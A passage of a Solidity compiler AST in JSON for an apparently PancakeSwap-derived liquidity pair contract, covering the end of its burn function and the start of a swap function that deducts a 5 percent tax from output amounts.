																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1789,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2355,
																		"src": "8875:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_Pair_$2193",
																			"typeString": "contract Pair"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_Pair_$2193",
																			"typeString": "contract Pair"
																		}
																	],
																	"id": 1788,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "8867:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 1790,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8867:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1785,
																		"name": "_token1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1680,
																		"src": "8848:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 1784,
																	"name": "IERC20",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 533,
																	"src": "8841:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																		"typeString": "type(contract IERC20)"
																	}
																},
																"id": 1786,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8841:15:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_IERC20_$533",
																	"typeString": "contract IERC20"
																}
															},
															"id": 1787,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balanceOf",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 494,
															"src": "8841:25:6",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																"typeString": "function (address) view external returns (uint256)"
															}
														},
														"id": 1791,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "8841:40:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8830:51:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1793,
												"nodeType": "ExpressionStatement",
												"src": "8830:51:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1795,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1684,
															"src": "8900:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1796,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1695,
															"src": "8910:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1797,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1669,
															"src": "8920:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1798,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1671,
															"src": "8931:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1794,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1255,
														"src": "8892:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1799,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8892:49:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1800,
												"nodeType": "ExpressionStatement",
												"src": "8892:49:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1801,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1714,
													"src": "8955:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1811,
												"nodeType": "IfStatement",
												"src": "8951:47:6",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1809,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1802,
															"name": "kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 984,
															"src": "8962:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1807,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 976,
																	"src": "8989:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1804,
																			"name": "reserve0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 974,
																			"src": "8975:8:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		],
																		"id": 1803,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8970:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 1805,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8970:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1806,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2267,
																"src": "8970:18:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1808,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8970:28:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "8962:36:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1810,
													"nodeType": "ExpressionStatement",
													"src": "8962:36:6"
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1813,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2325,
																"src": "9058:3:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1814,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "9058:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1815,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1664,
															"src": "9070:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1816,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1666,
															"src": "9079:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1817,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1659,
															"src": "9088:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 1812,
														"name": "Burn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1088
														],
														"referencedDeclaration": 1088,
														"src": "9053:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
															"typeString": "function (address,uint256,uint256,address)"
														}
													},
													"id": 1818,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9053:38:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1819,
												"nodeType": "EmitStatement",
												"src": "9048:43:6"
											}
										]
									},
									"documentation": null,
									"id": 1821,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1662,
											"modifierName": {
												"argumentTypes": null,
												"id": 1661,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1006,
												"src": "7718:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "7718:4:6"
										}
									],
									"name": "burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1660,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1659,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1821,
												"src": "7692:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1658,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7692:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7682:26:6"
									},
									"returnParameters": {
										"id": 1667,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1664,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 1821,
												"src": "7732:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1663,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7732:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1666,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 1821,
												"src": "7746:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1665,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7746:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7731:28:6"
									},
									"scope": 2193,
									"src": "7669:1429:6",
									"stateMutability": "nonpayable",
									"superFunction": 823,
									"visibility": "external"
								},
								{
									"body": {
										"id": 2116,
										"nodeType": "Block",
										"src": "11733:2713:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1841,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1837,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1835,
																	"name": "amount0Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1823,
																	"src": "11764:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1836,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "11777:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "11764:14:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1840,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1838,
																	"name": "amount1Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1825,
																	"src": "11782:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1839,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "11795:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "11782:14:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "11764:32:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54",
															"id": 1842,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "11810:37:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\""
															},
															"value": "Pancake: INSUFFICIENT_OUTPUT_AMOUNT"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\""
															}
														],
														"id": 1834,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "11743:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1843,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "11743:114:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1844,
												"nodeType": "ExpressionStatement",
												"src": "11743:114:6"
											},
											{
												"assignments": [
													1846,
													1848,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1846,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 2116,
														"src": "11868:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1845,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "11868:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1848,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 2116,
														"src": "11887:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1847,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "11887:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1851,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1849,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1028,
														"src": "11910:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1850,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "11910:13:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11867:56:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1859,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1855,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1853,
																	"name": "amount0Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1823,
																	"src": "11969:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 1854,
																	"name": "_reserve0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1846,
																	"src": "11982:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "11969:22:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1858,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1856,
																	"name": "amount1Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1825,
																	"src": "11995:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 1857,
																	"name": "_reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1848,
																	"src": "12008:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "11995:22:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "11969:48:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4c4951554944495459",
															"id": 1860,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "12031:33:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_410624995b1b083dcf6f8603df497c85feb7b93fc33473e1167ca929c6d9b9e6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY\""
															},
															"value": "Pancake: INSUFFICIENT_LIQUIDITY"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_410624995b1b083dcf6f8603df497c85feb7b93fc33473e1167ca929c6d9b9e6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY\""
															}
														],
														"id": 1852,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "11948:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1861,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "11948:126:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1862,
												"nodeType": "ExpressionStatement",
												"src": "11948:126:6"
											},
											{
												"assignments": [
													1864
												],
												"declarations": [
													{
														"constant": false,
														"id": 1864,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 2116,
														"src": "12085:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1863,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12085:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1865,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "12085:13:6"
											},
											{
												"assignments": [
													1867
												],
												"declarations": [
													{
														"constant": false,
														"id": 1867,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 2116,
														"src": "12108:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1866,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12108:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1868,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "12108:13:6"
											},
											{
												"id": 2006,
												"nodeType": "Block",
												"src": "12131:1284:6",
												"statements": [
													{
														"assignments": [
															1870
														],
														"declarations": [
															{
																"constant": false,
																"id": 1870,
																"name": "taxamount0Out",
																"nodeType": "VariableDeclaration",
																"scope": 2006,
																"src": "12145:18:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1869,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "12145:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1879,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1878,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1871,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1823,
																"src": "12166:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1877,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1874,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1872,
																				"name": "amount0Out",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1823,
																				"src": "12180:10:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "*",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "35",
																				"id": 1873,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "12193:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_5_by_1",
																					"typeString": "int_const 5"
																				},
																				"value": "5"
																			},
																			"src": "12180:14:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"id": 1875,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "12179:16:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "313030",
																	"id": 1876,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12198:3:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_100_by_1",
																		"typeString": "int_const 100"
																	},
																	"value": "100"
																},
																"src": "12179:22:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "12166:35:6",
															"typeDescriptions": {
